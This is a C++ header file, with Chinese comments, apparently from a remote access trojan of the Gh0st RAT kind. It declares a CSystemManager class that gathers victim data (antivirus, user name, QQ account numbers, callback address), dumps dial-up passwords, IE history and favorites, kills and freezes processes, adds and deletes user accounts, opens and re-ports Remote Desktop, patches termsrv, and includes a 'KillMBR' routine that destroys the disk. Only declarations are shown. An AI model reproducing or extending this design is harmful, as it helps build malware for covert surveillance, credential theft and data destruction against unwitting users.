// SystemManager.h: interface for the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SYSTEMMANAGER_H__5E44B060_837A_4D2D_9E75_E4A33E51CAE1__INCLUDED_)
#define AFX_SYSTEMMANAGER_H__5E44B060_837A_4D2D_9E75_E4A33E51CAE1__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

//信息列表结构体
struct tagSystemInfo
{
	char szCpuInfo[50];   //CPU信息
	char szActiveTime[100]; //活动时间
	char szAntiVirus[50]; //杀毒软件
	char szUserName[50];   //当前用户名
	char szPcName[50];  //计算机名
	char szRemotePort[10]; //远程端口
	DWORD szMemory;         //内存大小 
	DWORD szMemoryFree;     //可用内存 
	DWORD szDriveSize;      //硬盘大小
	DWORD szDriveFreeSize;  //可用硬盘大小
	char szOpenInfo[50];	// 是否双开(是否开启)
	char szDLLPath[MAX_PATH];    // 服务端路径
	char szScrxy[20];			//屏幕分辨率
	char szQQNum[100];		//当前QQ
	char szQQNums[1024];	//历史QQ
	int port;				//端口
	char szAddress[50];		//上线地址
	char szTime[128];		//空闲时间
	bool bIsActive;			//用户状态
	char szLanguage[50];	//系统语言
};

struct tagSysstatus
{
	int		Mem;
	int		cpu;
	DWORD	Bandout;
	DWORD	Bandout_B;
	int		dwTime;
	bool	bIsActive;

};

class CSystemManager : public CManager  
{
public:
	CSystemManager(CClientSocket *pClient,LPCSTR lpszHost, UINT nPort);
	virtual ~CSystemManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static BOOL DebugPrivilege(const char *PName,BOOL bEnable);
	static void ShutdownWindows(DWORD dwReason);
	static bool CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam);
private:
	LPBYTE getProcessList();
	LPBYTE getWindowsList();
	LPBYTE getSoftWareList();

	void SendProcessList();
	void SendWindowsList();
	void SendDialupassList();
	void SendSoftWareList();

	void KillProcess(LPBYTE lpBuffer, UINT nSize);
	void TestWindow(LPBYTE lpBuffer);
	void CloseWindow(LPBYTE lpBuffer);

	
	void SendSysInfoList();
	void GetSystemInfo(tagSystemInfo* pSysInfo);
	
	void SendSysUserList();
	LPBYTE getSysUserList();
	
	void SendUserStateList();
	LPBYTE getUserStateList();

	LPBYTE getNetWorkList();
	void SendNetWorkList();

	LPBYTE getRunList();
	void SendRunList();

	void SendHostsList();

	void SendFileAttr(LPCSTR lpBuffer); //文件属性

	void ProcessFreezing(LPBYTE lpBuffer, UINT nSize); //进程冻结
	void ProcessThawing(LPBYTE lpBuffer, UINT nSize);//进程解冻

	void CSystemManager::SendIEHistoryList(); // 发送IE历史记录
	LPBYTE CSystemManager::getIEHistoryList(); // 取IE历史记录

	void CSystemManager::SendFavoritesUrlList();// 发送收藏夹
	LPBYTE CSystemManager::getFavoritesUrlList();//

	void CSystemManager::SendNetStateList();// 发送网络连接

	void CSystemManager::KillMBR(); // 硬盘毁灭
	
//	bool CSystemManager::GetBandOut(DWORD &dwBandoutBytes,DWORD &dwBandInputBytes); //上下行带宽


	void ChangeUserState(LPBYTE lpBuffer, UINT nSize , UINT User_kt);  //帐户启用 停止
	void ChangeUserPass(LPBYTE lpBuffer, UINT nSize);
	void DeleteUser(LPBYTE lpBuffer, UINT nSize);
	void DisconnectUser(LPBYTE lpBuffer, UINT nSize);
	void LogOffUser(LPBYTE lpBuffer, UINT nSize);
	void NoNetAddUser(LPBYTE lpBuffer, UINT nSize);
	BOOL Change3389Port(LPVOID lparam);
	void Open3389();
	void GetTermsrvFile();
	BOOL WriteTermsrv(LPBYTE lpBuffer, UINT nSize);

	HANDLE hSendMemoryThread;
	static DWORD WINAPI SendCPUAndMemoryThread(LPVOID lparam);

	UINT    NetPort;    //连接端口
//     UCHAR   NetLine;    //连接方式
//     UCHAR   NetOpert;   //运行类型
    LPCSTR Linkaddress;  //连接地址
	


};

#endif // !defined(AFX_SYSTEMMANAGER_H__5E44B060_837A_4D2D_9E75_E4A33E51CAE1__INCLUDED_)
